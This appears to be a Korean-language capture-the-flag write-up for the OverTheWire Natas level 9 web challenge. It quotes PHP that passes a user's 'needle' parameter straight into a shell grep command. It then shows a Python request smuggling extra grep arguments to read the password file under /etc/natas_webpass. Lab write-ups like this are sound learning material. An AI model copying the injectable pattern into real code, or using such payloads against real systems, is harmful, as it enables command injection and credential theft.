# Category

web

# Overview

Find words containing:

Output:

# Analysis

- `view sourcecode`를 확인한 결과 아래와 같이 php코드가 있었으며, 사용자가 입력한 `needle`의 `value`를 시스템 내에서 `grep`를 이용하여 일치하는 값을 찾는 명령어으로 사용자가 의도하지않은 입력값을 통해 시스템 내의 다른 내용을 볼 수 있는 취약점이 존재한다.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

- 다음 레벨의 비밀번호는 `/etc/natas_webpass/natas10`에 존재한다.

# Exploitation

`grep -i $key dictionary.txt`사이에 사용자의 명령이 들어가기 때문에 `grep -i <-E '.' /etc/natas_webpass/natas10> dictionary.txt` 와 같이 비밀번호가 있는 파일을 같이 열어 값을 확인할 수 있다.

```python
# full exploitation solve.py
res = req(
  method="GET",
  url="http://natas9.natas.labs.overthewire.org/?needle=-E '*' /etc/natas_webpass/natas10&submit=Search",
  auth=("natas9", "ZE...6t")
)
```

# Flag

`t7...Ou`
